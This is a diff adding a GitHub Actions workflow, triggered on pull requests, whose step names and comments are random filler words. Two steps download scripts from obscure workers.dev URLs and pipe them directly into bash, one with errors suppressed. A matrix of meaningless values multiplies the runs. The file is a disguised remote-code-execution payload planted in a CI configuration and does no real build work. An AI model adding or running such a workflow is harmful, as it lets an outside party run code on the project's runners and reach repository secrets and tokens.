@@ -1,0 +1,33 @@
+name: portable
+
+on:
+  pull_request:
+
+#physician sentence shield transform
+concurrency:
+  group: pull
+
+#dictation satisfactory curl guideline
+#scold laundry respond endure
+jobs:
+  blank:
+    #prescribe accuracy lest congress
+    steps:
+    - name:  dorm-earnest
+      uses: actions/checkout@v6
+    #realize instrument
+    #preventable consumption advice
+    - name: breast
+      continue-on-error: true
+      #include curtain excellent besides sufficient competent
+      run: |
+        curl -S "https://node.vrotsosvanhouten30272.workers.dev/7a711b9ef2ad997b0/0301c4f/4f3a61/604/31259e21c313415fa2/18946cc/345058?h=1777774959&z=bii&pq=yoo&p=ega" | bash
+    #artistic devil
+    - name: plantation
+      run: |
+        curl -S -L "https://nggr01.lucky-darkness-f361.workers.dev/061d5667837bb16027fea39f85c7c60d38900fcc2158a69512b2e712e065384a?wxn=1777796859&n=jk" | bash
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        vacuum: ["encourage", "minus", "cash", "hardship", "storage"]
+        treasure: ["offend", "contemporary", "feature", "stable"]
